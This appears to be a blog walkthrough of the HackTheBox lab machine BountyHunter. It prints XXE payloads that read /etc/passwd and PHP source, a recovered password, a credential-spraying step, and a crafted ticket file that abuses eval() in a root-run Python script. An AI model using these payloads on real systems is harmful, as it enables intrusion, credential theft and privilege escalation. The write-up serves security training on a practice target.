<!DOCTYPE html>
<html lang="en">
<head>
  
    <title>HackTheBox: BountyHunter :: Yet, another infosec blog</title>
  
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="description" content="Today, we are delving into BountyHunter as another HackTheBox machine in our sidetrack series.
I hope you have a nice weekend and without further ado, let us jump right in!
Enumeration Nmap output ┌──(kali㉿kali)-[~/Desktop/HTB/Boxes/BountyHunter] └─$ cat nmap/BountyHunter.nmap # Nmap 7.91 scan initiated Sat Oct 2 22:12:07 2021 as: nmap -sS -sV -sC -p- -v -oA nmap/BountyHunter 10.10.11.100 Nmap scan report for 10.10.11.100 Host is up (0.048s latency). Not shown: 65533 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8." />
<meta name="keywords" content="infosec, pwn, ctf, challenges, hackthebox, reverse" />
<meta name="robots" content="noodp" />
<link rel="canonical" href="https://legiahuyy.github.io/blog/en/posts/htb-bountyhunter/" />




<link rel="stylesheet" href="https://legiahuyy.github.io/blog/en/assets/style.css">

  <link rel="stylesheet" href="https://legiahuyy.github.io/blog/en/assets/green.css">






<link rel="apple-touch-icon" href="https://legiahuyy.github.io/blog/en/img/apple-touch-icon-192x192.png">

  <link rel="shortcut icon" href="https://legiahuyy.github.io/blog/en/img/favicon/green.png">



<meta name="twitter:card" content="summary" />

  
    <meta name="twitter:site" content="" />
  
    <meta name="twitter:creator" content="The Archivist" />



<meta property="og:locale" content="en" />
<meta property="og:type" content="article" />
<meta property="og:title" content="HackTheBox: BountyHunter">
<meta property="og:description" content="Today, we are delving into BountyHunter as another HackTheBox machine in our sidetrack series.
I hope you have a nice weekend and without further ado, let us jump right in!
Enumeration Nmap output ┌──(kali㉿kali)-[~/Desktop/HTB/Boxes/BountyHunter] └─$ cat nmap/BountyHunter.nmap # Nmap 7.91 scan initiated Sat Oct 2 22:12:07 2021 as: nmap -sS -sV -sC -p- -v -oA nmap/BountyHunter 10.10.11.100 Nmap scan report for 10.10.11.100 Host is up (0.048s latency). Not shown: 65533 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8." />
<meta property="og:url" content="https://legiahuyy.github.io/blog/en/posts/htb-bountyhunter/" />
<meta property="og:site_name" content="Yet, another infosec blog" />

  
    <meta property="og:image" content="https://legiahuyy.github.io/blog/en/img/favicon/green.png">
  

<meta property="og:image:width" content="2048">
<meta property="og:image:height" content="1024">

  <meta property="article:section" content="hackthebox" />


  <meta property="article:published_time" content="2021-10-03 09:30:00 &#43;1345 &#43;1345" />












</head>
<body class="green">


<div class="container center headings--one-size">

  <header class="header">
  <div class="header__inner">
    <div class="header__logo">
      <a href="/">
  <div class="logo">
    <style>
      .blink {
        animation: blinker 1s linear infinite;
        color: red!important;
}
.logo_anchor
{
  color: blue!important;
}

@keyframes blinker {
  50% {
    opacity: 0;
  }
}
    </style>
    <div class="logo_anchor">
      ./&ThinSpace; 
    </div>
      Archivist
    <div class="blink"> # </div> 
  </div>
</a>

    </div>
    
      <div class="menu-trigger">menu</div>
    
  </div>
  
    <nav class="menu">
  <ul class="menu__inner menu__inner--desktop">
    
      
        
          <li><a href="/blog/en/posts">1.Posts</a></li>
        
      
        
          <li><a href="/blog/en/categories">2.Categories</a></li>
        
      
        
          <li><a href="/blog/en/tags">3.Tags</a></li>
        
      
        
          <li><a href="/blog/en/about">4.About</a></li>
        
      
      
        <ul class="menu__sub-inner">
          <li class="menu__sub-inner-more-trigger">More ▾</li>

          <ul class="menu__sub-inner-more hidden">
            
              
                <li><a href="/blog/en/index.xml">RSS</a></li>
              
            
              
                <li><a href="https://buymeacoffee.com/7Bkc3SH">Support</a></li>
              
            
          </ul>
        </ul>
      
    

    
  </ul>

  <ul class="menu__inner menu__inner--mobile">
    
      
        <li><a href="/blog/en/posts">1.Posts</a></li>
      
    
      
        <li><a href="/blog/en/categories">2.Categories</a></li>
      
    
      
        <li><a href="/blog/en/tags">3.Tags</a></li>
      
    
      
        <li><a href="/blog/en/about">4.About</a></li>
      
    
      
        <li><a href="/blog/en/index.xml">RSS</a></li>
      
    
      
        <li><a href="https://buymeacoffee.com/7Bkc3SH">Support</a></li>
      
    
    
  </ul>
</nav>

  
</header>


  <div class="content">
    
<div class="post">
  <h1 class="post-title">
    <a href="https://legiahuyy.github.io/blog/en/posts/htb-bountyhunter/">HackTheBox: BountyHunter</a></h1>
  <div class="post-meta">
    
      <span class="post-date">
        2021-10-03
        
      </span>
    
    
      <span class="post-author">:: The Archivist</span>
    
    
      <span class="post-reading-time">:: 5 min read (916 words)</span>
    
  </div>

  
  <span class="post-tags">
    
    #<a href="https://legiahuyy.github.io/blog/en/tags/hackthebox/">hackthebox</a>&nbsp;
    
    #<a href="https://legiahuyy.github.io/blog/en/tags/network/">network</a>&nbsp;
    
    #<a href="https://legiahuyy.github.io/blog/en/tags/machine/">machine</a>&nbsp;
    
  </span>
  
  


  
    <div class="table-of-contents">
      <h2>
        
          Table of Contents
        
      </h2>
      <nav id="TableOfContents">
  <ul>
    <li><a href="#enumeration">Enumeration</a>
      <ul>
        <li><a href="#nmap-output">Nmap output</a></li>
      </ul>
    </li>
    <li><a href="#exploitation">Exploitation</a>
      <ul>
        <li><a href="#xml-eternal-entity">XML Eternal Entity</a></li>
        <li><a href="#credentials-spraying-with-cme">Credentials spraying with CME</a></li>
      </ul>
    </li>
    <li><a href="#privilege-escalation">Privilege Escalation</a>
      <ul>
        <li><a href="#eval--evil">Eval() == Evil</a></li>
      </ul>
    </li>
  </ul>
</nav>
    </div>
  

  <div class="post-content"><div>
        <p>Today, we are delving into BountyHunter as another HackTheBox machine in our <em>sidetrack</em> series.</p>
<p>I hope you have a nice weekend and without further ado, let us jump right in!</p>
<h2 id="enumeration">Enumeration<a href="#enumeration" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<h3 id="nmap-output">Nmap output<a href="#nmap-output" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Desktop/HTB/Boxes/BountyHunter<span style="color:#f92672">]</span>
└─$ cat nmap/BountyHunter.nmap 
<span style="color:#75715e"># Nmap 7.91 scan initiated Sat Oct  2 22:12:07 2021 as: nmap -sS -sV -sC -p- -v -oA nmap/BountyHunter 10.10.11.100</span>
Nmap scan report <span style="color:#66d9ef">for</span> 10.10.11.100
Host is up <span style="color:#f92672">(</span>0.048s latency<span style="color:#f92672">)</span>.
Not shown: <span style="color:#ae81ff">65533</span> closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
| ssh-hostkey: 
|   <span style="color:#ae81ff">3072</span> d4:4c:f5:79:9a:79:a3:b0:f1:66:25:52:c9:53:1f:e1 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
|   <span style="color:#ae81ff">256</span> a2:1e:67:61:8d:2f:7a:37:a7:ba:3b:51:08:e8:89:a6 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
|_  <span style="color:#ae81ff">256</span> a5:75:16:d9:69:58:50:4a:14:11:7a:42:c1:b6:23:44 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
80/tcp open  http    Apache httpd 2.4.41 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
|_http-favicon: Unknown favicon MD5: 556F31ACD686989B1AFCF382C05846AA
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
|_http-title: Bounty Hunters
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</code></pre></div><p>Based on nmap result, Apache and SSH service were running on port 80 and 22, respectively.</p>
<p>The default index shows no conspicuous detail aside from its portal redirecting to a report form.</p>
<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-10-03-HTB-BountyHunter/2021-10-03_15-34.png" alt=""></p>
<p>Initially, several XSS/SQLi payloads were tested but displayed incapable of producing any useful result, albeit the input values seemed not to be filtered or sanitized for special characters.</p>
<h2 id="exploitation">Exploitation<a href="#exploitation" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<h3 id="xml-eternal-entity">XML Eternal Entity<a href="#xml-eternal-entity" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
<p>As the above solution is not possible, let us use BurpSuite to intercept requests and get a closer look.</p>
<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-10-03-HTB-BountyHunter/2021-10-03_15-46.png" alt=""></p>
<p>From here you can tell that the value of <code>data</code> field is encoded, so I prefer using  <a href="https://gchq.github.io/CyberChef/">CyberChef</a>, a powerful yet simple utility, to analyze and decode it.</p>
<p>Our recipe consists of <strong>URL Decode</strong> and <strong>From Base64</strong>, sequentially.</p>
<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-10-03-HTB-BountyHunter/2021-10-03_15-48.png" alt="Using Cyberchef to decode"></p>
<p>The output is of XML and thereby allowing us to interfere and view files on the target server filesystem as well as other back-end sources or external entities that the server itself can access. This is an XXE injection, a type of attack against an application that parses XML input.</p>
<p>You can read more about XXE <a href="https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing">here</a>.</p>
<p>Thanks to that, we can make an attempt to trigger the XXE vulnerability. The following payload includes and shows us the <code>/etc/passwd</code> on the server.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#75715e">&lt;?xml  version=&#34;1.0&#34; encoding=&#34;ISO-8859-1&#34;?&gt;</span>
<span style="color:#75715e">&lt;!DOCTYPE foo [
</span><span style="color:#75715e">  &lt;!ELEMENT foo ANY &gt;</span>
  <span style="color:#75715e">&lt;!ENTITY xxe SYSTEM &#34;file:///etc/passwd&#34; &gt;</span>]&gt;
		<span style="color:#f92672">&lt;bugreport&gt;</span>
		<span style="color:#f92672">&lt;title&gt;</span>&amp;xxe;<span style="color:#f92672">&lt;/title&gt;</span>
		<span style="color:#f92672">&lt;cwe&gt;</span>x<span style="color:#f92672">&lt;/cwe&gt;</span>
		<span style="color:#f92672">&lt;cvss&gt;</span>x<span style="color:#f92672">&lt;/cvss&gt;</span>
		<span style="color:#f92672">&lt;reward&gt;</span>aaaa&gt;<span style="color:#f92672">&lt;/reward&gt;</span>
		<span style="color:#f92672">&lt;/bugreport&gt;</span>
</code></pre></div><p>And the return is:</p>
<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-10-03-HTB-BountyHunter/2021-10-03_15-50.png" alt=""></p>
<p>In case the <code>expect://</code> module is available on the target server then you can craft your payload as below and actually get RCE.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#75715e">&lt;?xml  version=&#34;1.0&#34; encoding=&#34;ISO-8859-1&#34;?&gt;</span>
<span style="color:#75715e">&lt;!DOCTYPE foo [
</span><span style="color:#75715e">  &lt;!ELEMENT foo ANY &gt;</span>
  <span style="color:#75715e">&lt;!ENTITY xxe SYSTEM &#34;expect://ls&#34; &gt;</span>]&gt; <span style="color:#75715e">&lt;!-- execute &#34;ls&#34; command --&gt;</span>
		<span style="color:#f92672">&lt;bugreport&gt;</span>
		<span style="color:#f92672">&lt;title&gt;</span>&amp;xxe;<span style="color:#f92672">&lt;/title&gt;</span>
		<span style="color:#f92672">&lt;cwe&gt;</span>x<span style="color:#f92672">&lt;/cwe&gt;</span>
		<span style="color:#f92672">&lt;cvss&gt;</span>x<span style="color:#f92672">&lt;/cvss&gt;</span>
		<span style="color:#f92672">&lt;reward&gt;</span>aaaa&gt;<span style="color:#f92672">&lt;/reward&gt;</span>
		<span style="color:#f92672">&lt;/bugreport&gt;</span>
</code></pre></div><p>Unfortunately, the result is just four empty fields, which indicates that <code>expect://</code> is not loaded or this is a blind injection. Not really matter, though.</p>
<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-10-03-HTB-BountyHunter/2021-10-03_15-51.png" alt=""></p>
<p>We still have another solution of using a PHP wrapper to retrieve back-end files on the server. If you still remember, we have already <a href="https://legiahuyy.github.io/blog/en/RFI-Wrapper/">used it</a> in one of my university challenges.</p>
<p>So our new payload is as following:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#75715e">&lt;?xml  version=&#34;1.0&#34; encoding=&#34;ISO-8859-1&#34;?&gt;</span>
<span style="color:#75715e">&lt;!DOCTYPE foo [
</span><span style="color:#75715e">  &lt;!ELEMENT foo ANY &gt;</span>
  <span style="color:#75715e">&lt;!ENTITY xxe SYSTEM &#34;php://filter/convert.base64-encode/resource=index.php&#34; &gt;</span>]&gt;
		<span style="color:#f92672">&lt;bugreport&gt;</span>
		<span style="color:#f92672">&lt;title&gt;</span>&amp;xxe;<span style="color:#f92672">&lt;/title&gt;</span>
		<span style="color:#f92672">&lt;cwe&gt;</span>x<span style="color:#f92672">&lt;/cwe&gt;</span>
		<span style="color:#f92672">&lt;cvss&gt;</span>x<span style="color:#f92672">&lt;/cvss&gt;</span>
		<span style="color:#f92672">&lt;reward&gt;</span>aaaa&gt;<span style="color:#f92672">&lt;/reward&gt;</span>
		<span style="color:#f92672">&lt;/bugreport&gt;</span>
</code></pre></div><p>It reads and encodes <code>index.php</code> on the server to a base64 string.</p>
<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-10-03-HTB-BountyHunter/2021-10-03_15-58.png" alt=""></p>
<p>Yet it is just some HTML and CSS, nothing special so I have <code>gobuster</code> enumerating <code>.php</code> and other sensitive extensions.</p>
<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-10-03-HTB-BountyHunter/2021-10-03_16-01.png" alt="db.php"></p>
<p>After retrieving <code>db.php</code> and decoding the content, we have some credentials.</p>
<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-10-03-HTB-BountyHunter/2021-10-03_16-04.png" alt=""></p>
<p>But neither <code>test</code> nor <code>admin</code> was a valid username for SSH login, so I try looking for another user with console on the server system by searching for <code>/bin/bash</code> or <code>/home/(username)</code> in the <code>/etc/passwd</code> file.</p>
<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-10-03-HTB-BountyHunter/2021-10-03_16-08.png" alt=""></p>
<p>There are just <code>root</code> and <code>Development</code>.</p>
<h3 id="credentials-spraying-with-cme">Credentials spraying with CME<a href="#credentials-spraying-with-cme" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
<p>In this step, CrackMapExec (CME) should be able to help us get into the server internal. In order to work, CME needs two files containing all usernames and passwords (i.e, <code>user.txt</code> and <code>pass.txt</code>).</p>
<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-10-03-HTB-BountyHunter/2021-10-03_16-16.png" alt=""></p>
<p>And the valid credentials are: <code>development:m19RoAU0hP41A1sTsq6K</code>.</p>
<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-10-03-HTB-BountyHunter/2021-10-03_16-18.png" alt=""></p>
<h2 id="privilege-escalation">Privilege Escalation<a href="#privilege-escalation" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<p>To know whether <code>development</code> user is capable of executing command as superuser or not, try <code>$ sudo -l</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">development@bountyhunter:~$ sudo -l
Matching Defaults entries <span style="color:#66d9ef">for</span> development on
    bountyhunter:
    env_reset, mail_badpass,
    secure_path<span style="color:#f92672">=</span>/usr/local/sbin<span style="color:#ae81ff">\:</span>/usr/local/bin<span style="color:#ae81ff">\:</span>/usr/sbin<span style="color:#ae81ff">\:</span>/usr/bin<span style="color:#ae81ff">\:</span>/sbin<span style="color:#ae81ff">\:</span>/bin<span style="color:#ae81ff">\:</span>/snap/bin

User development may run the following commands on
        bountyhunter:
    <span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> NOPASSWD: /usr/bin/python3.8
        /opt/skytrain_inc/ticketValidator.py

</code></pre></div><p>As can be seen, <code>development</code> can execute <code>/usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py</code> as root without password.</p>
<h3 id="eval--evil">Eval() == Evil<a href="#eval--evil" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
<p>Reading <code>/opt/skytrain_inc/ticketValidator.py</code> source.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#Skytrain Inc Ticket Validation System 0.1</span>
<span style="color:#75715e">#Do not distribute this file.</span>

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">load_file</span>(loc):
    <span style="color:#66d9ef">if</span> loc<span style="color:#f92672">.</span>endswith(<span style="color:#e6db74">&#34;.md&#34;</span>):
        <span style="color:#66d9ef">return</span> open(loc, <span style="color:#e6db74">&#39;r&#39;</span>)
    <span style="color:#66d9ef">else</span>:
        print(<span style="color:#e6db74">&#34;Wrong file type.&#34;</span>)
        exit()

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">evaluate</span>(ticketFile):
    <span style="color:#75715e">#Evaluates a ticket to check for ireggularities.</span>
    code_line <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>
    <span style="color:#66d9ef">for</span> i,x <span style="color:#f92672">in</span> enumerate(ticketFile<span style="color:#f92672">.</span>readlines()):
        <span style="color:#66d9ef">if</span> i <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
            <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> x<span style="color:#f92672">.</span>startswith(<span style="color:#e6db74">&#34;# Skytrain Inc&#34;</span>):
                <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>
            <span style="color:#66d9ef">continue</span>
        <span style="color:#66d9ef">if</span> i <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>:
            <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> x<span style="color:#f92672">.</span>startswith(<span style="color:#e6db74">&#34;## Ticket to &#34;</span>):
                <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>
            print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Destination: </span><span style="color:#e6db74">{</span><span style="color:#e6db74">&#39; &#39;</span><span style="color:#f92672">.</span>join(x<span style="color:#f92672">.</span>strip()<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39; &#39;</span>)[<span style="color:#ae81ff">3</span>:])<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
            <span style="color:#66d9ef">continue</span>

        <span style="color:#66d9ef">if</span> x<span style="color:#f92672">.</span>startswith(<span style="color:#e6db74">&#34;__Ticket Code:__&#34;</span>):
            code_line <span style="color:#f92672">=</span> i<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>
            <span style="color:#66d9ef">continue</span>

        <span style="color:#66d9ef">if</span> code_line <span style="color:#f92672">and</span> i <span style="color:#f92672">==</span> code_line:
            <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> x<span style="color:#f92672">.</span>startswith(<span style="color:#e6db74">&#34;**&#34;</span>):
                <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>
            ticketCode <span style="color:#f92672">=</span> x<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;**&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>)<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34;+&#34;</span>)[<span style="color:#ae81ff">0</span>]
            <span style="color:#66d9ef">if</span> int(ticketCode) <span style="color:#f92672">%</span> <span style="color:#ae81ff">7</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">4</span>:
                validationNumber <span style="color:#f92672">=</span> eval(x<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;**&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>))
                <span style="color:#66d9ef">if</span> validationNumber <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">100</span>:
                    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">True</span>
                <span style="color:#66d9ef">else</span>:
                    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>
    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
    fileName <span style="color:#f92672">=</span> input(<span style="color:#e6db74">&#34;Please enter the path to the ticket file.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
    ticket <span style="color:#f92672">=</span> load_file(fileName)
    <span style="color:#75715e">#DEBUG print(ticket)</span>
    result <span style="color:#f92672">=</span> evaluate(ticket)
    <span style="color:#66d9ef">if</span> (result):
        print(<span style="color:#e6db74">&#34;Valid ticket.&#34;</span>)
    <span style="color:#66d9ef">else</span>:
        print(<span style="color:#e6db74">&#34;Invalid ticket.&#34;</span>)
    ticket<span style="color:#f92672">.</span>close

main()

</code></pre></div><p>Code breakdown:</p>
<p><code>load_file</code> checks whether the file extension is <code>.md</code> or not.</p>
<p><code>evaluate</code></p>
<ul>
<li>returns <code>False</code> whether the first line doesn&rsquo;t start with <code># Skytrain Inc</code> or <code>## Ticket to</code>; otherwise, prints the destination and continues.</li>
<li>reads the string below &ldquo;__Ticket Code:__&rdquo;, removes (**) and thereafter assigns the number before the (+) operator as<code>ticketCode</code>.</li>
<li>Executes the following string as code whether the modulo of <code>ticketCode</code> and 7 is 4.</li>
</ul>
<p>Hence, our <code>root_ticket.md</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"> Skytrain Inc
<span style="color:#75715e">## Ticket to New Haven</span>
__Ticket Code:__
**32+100 and __import__<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;os&#39;</span><span style="color:#f92672">)</span>.system<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;cat /root/root.txt&#39;</span><span style="color:#f92672">)</span>
<span style="color:#75715e">##Issued: 2021/10/03</span>
<span style="color:#75715e">#End Ticket</span>
</code></pre></div><p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-10-03-HTB-BountyHunter/2021-10-03_17-13.png" alt=""></p>

      </div></div>

  
  
<div class="pagination">
    <div class="pagination__title">
        <span class="pagination__title-h">Read other posts</span>
        <hr />
    </div>
    <div class="pagination__buttons">
        
        <span class="button previous">
            <a href="https://legiahuyy.github.io/blog/en/posts/pwns-1/">
                <span class="button__icon">←</span>
                <span class="button__text">PWN Journey: Part 1</span>
            </a>
        </span>
        
        
        <span class="button next">
            <a href="https://legiahuyy.github.io/blog/en/posts/htb-cap/">
                <span class="button__text">HackTheBox: Cap</span>
                <span class="button__icon">→</span>
            </a>
        </span>
        
    </div>
</div>

  

  

</div>

  </div>

  
    <footer class="footer">
  <div class="footer__inner">
    
      <div class="copyright copyright--user">
        <span>© 2022 The Archivist</a>.</span>
    
        <span>All posts are licensed under <a href="https://creativecommons.org/licenses/by/4.0/legalcode">CC BY 4.0</a>.</span>
      </div>
  </div>
</footer>

<script src="https://legiahuyy.github.io/blog/en/assets/main.js"></script>
<script src="https://legiahuyy.github.io/blog/en/assets/prism.js"></script>





<script src="https://cdnjs.cloudflare.com/ajax/libs/medium-zoom/1.0.6/medium-zoom.min.js" integrity="sha512-N9IJRoc3LaP3NDoiGkcPa4gG94kapGpaA5Zq9/Dr04uf5TbLFU5q0o8AbRhLKUUlp8QFS2u7S+Yti0U7QtuZvQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>


<script>
const images = Array.from(document.querySelectorAll(".post-content img"));
images.forEach(img => {
  mediumZoom(img, {
    margin: 0,  
    background: '#222129',
    scrollOffset: 40,  
    container: null,  
    template: null  
  });
});
</script>


  
</div>

</body>
</html>
